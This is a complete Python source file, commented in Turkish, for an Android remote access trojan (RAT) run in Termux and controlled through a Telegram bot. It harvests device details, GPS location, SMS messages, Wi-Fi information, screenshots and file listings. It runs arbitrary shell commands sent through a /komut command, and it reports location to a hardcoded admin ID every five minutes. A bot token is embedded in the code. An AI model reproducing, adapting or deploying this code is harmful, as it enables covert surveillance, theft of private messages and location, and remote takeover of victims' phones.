# telegram_rat.py - Telegram ile Kontrol Edilen Android RAT
# Bu kodu Termux'ta çalıştır
# Gereksinimler: pip install python-telegram-bot requests

import os
import subprocess
import json
import threading
import time
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== BURAYI DOLDUR ====================
BOT_TOKEN = "8920260133:AAHBSObXWxqK90wito1dsH56i9Pr5MnNk64"  # BotFather'dan aldığın token
ADMIN_ID = "6845229845"  # userinfobot'tan aldığın ID
# ======================================================

# ==================== VERİ TOPLAMA ====================

def get_device_info():
    """Cihaz bilgisi"""
    info = {}
    try:
        for prop in ['ro.product.model', 'ro.build.version.release',
                     'ro.product.manufacturer']:
            result = subprocess.run(['getprop', prop],
                                  capture_output=True, text=True)
            info[prop.split('.')[-1]] = result.stdout.strip()
    except:
        pass
    return info

def get_location():
    """Konum bilgisi"""
    try:
        result = subprocess.run(['termux-location'],
                              capture_output=True, text=True, timeout=10)
        return result.stdout
    except:
        return "Konum alınamadı (GPS kapalı olabilir)"

def execute_shell(command):
    """Shell komutu çalıştır"""
    try:
        result = subprocess.run(command, shell=True,
                              capture_output=True, text=True, timeout=10)
        return result.stdout + result.stderr
    except:
        return "Komut çalıştırılamadı"

def take_screenshot():
    """Ekran görüntüsü"""
    try:
        subprocess.run(['screencap', '-p', '/sdcard/screen.png'],
                      capture_output=True, timeout=10)
        return '/sdcard/screen.png'
    except:
        return None

def get_sms():
    """SMS listesi"""
    try:
        result = subprocess.run(['termux-sms-list'],
                              capture_output=True, text=True, timeout=10)
        return result.stdout
    except:
        return "SMS erişimi yok (termux-api kurulu mu?)"

def get_wifi_info():
    """Wi-Fi bilgisi"""
    try:
        result = subprocess.run(['termux-wifi-connectioninfo'],
                              capture_output=True, text=True, timeout=10)
        return result.stdout
    except:
        return "Wi-Fi bilgisi alınamadı"

def list_files(path='/sdcard'):
    """Dosyaları listele"""
    try:
        files = os.listdir(path)
        return '\n'.join(files[:50])
    except:
        return "Dizin listelenemedi"

# ==================== TELEGRAM BOT ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Başlangıç mesajı"""
    await update.message.reply_text(
        "📱 ANDROID RAT BOTU\n\n"
        "Komutlar:\n"
        "/bilgi - Cihaz bilgisi\n"
        "/konum - GPS konumu\n"
        "/sms - SMS listesi\n"
        "/wifi - Wi-Fi bilgisi\n"
        "/ekran - Ekran görüntüsü\n"
        "/dosya - Dosyaları listele\n"
        "/komut komut - Shell komutu çalıştır"
    )

async def bilgi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cihaz bilgisi gönder"""
    info = get_device_info()
    mesaj = "📱 CİHAZ BİLGİSİ\n\n"
    for key, value in info.items():
        mesaj += f"• {key}: {value}\n"
    await update.message.reply_text(mesaj)

async def konum(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Konum gönder"""
    await update.message.reply_text("📍 Konum alınıyor...")
    konum_bilgisi = get_location()
    await update.message.reply_text(f"📍 KONUM:\n{konum_bilgisi}")

async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """SMS listesi"""
    await update.message.reply_text("📩 SMS'ler alınıyor...")
    sms_listesi = get_sms()
    await update.message.reply_text(f"📩 SMS'LER:\n{sms_listesi[:4000]}")

async def wifi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wi-Fi bilgisi"""
    wifi_bilgisi = get_wifi_info()
    await update.message.reply_text(f"📶 Wi-Fi:\n{wifi_bilgisi}")

async def ekran(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ekran görüntüsü"""
    await update.message.reply_text("📸 Ekran görüntüsü alınıyor...")
    screenshot_path = take_screenshot()

    if screenshot_path and os.path.exists(screenshot_path):
        with open(screenshot_path, 'rb') as f:
            await update.message.reply_photo(f)
        os.remove(screenshot_path)
    else:
        await update.message.reply_text("❌ Ekran görüntüsü alınamadı")

async def dosya(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Dosyaları listele"""
    dosyalar = list_files()
    await update.message.reply_text(f"📁 DOSYALAR:\n{dosyalar[:4000]}")

async def komut(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shell komutu çalıştır"""
    if not context.args:
        await update.message.reply_text("❌ Kullanım: /komut ls")
        return

    komut_str = ' '.join(context.args)
    sonuc = execute_shell(komut_str)
    await update.message.reply_text(f"💻 SONUÇ:\n{sonuc[:4000]}")

async def otomatik_bilgi(context: ContextTypes.DEFAULT_TYPE):
    """Her 5 dakikada bir otomatik bilgi gönder"""
    info = get_device_info()
    konum_bilgisi = get_location()

    mesaj = f"🔄 OTOMATİK RAPOR\n"
    mesaj += f"Zaman: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    mesaj += f"Cihaz: {info}\n"
    mesaj += f"Konum: {konum_bilgisi}\n"

    await context.bot.send_message(chat_id=ADMIN_ID, text=mesaj)

# ==================== ANA FONKSİYON ====================

def main():
    """Botu başlat"""
    print("🤖 Telegram RAT başlatılıyor...")

    app = Application.builder().token(BOT_TOKEN).build()

    # Komutları ekle
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bilgi", bilgi))
    app.add_handler(CommandHandler("konum", konum))
    app.add_handler(CommandHandler("sms", sms))
    app.add_handler(CommandHandler("wifi", wifi))
    app.add_handler(CommandHandler("ekran", ekran))
    app.add_handler(CommandHandler("dosya", dosya))
    app.add_handler(CommandHandler("komut", komut))

    # Otomatik raporlama (her 5 dakikada bir)
    app.job_queue.run_repeating(otomatik_bilgi, interval=300, first=10)

    print("✅ Bot çalışıyor!")
    app.run_polling()

if __name__ == '__main__':
    main()
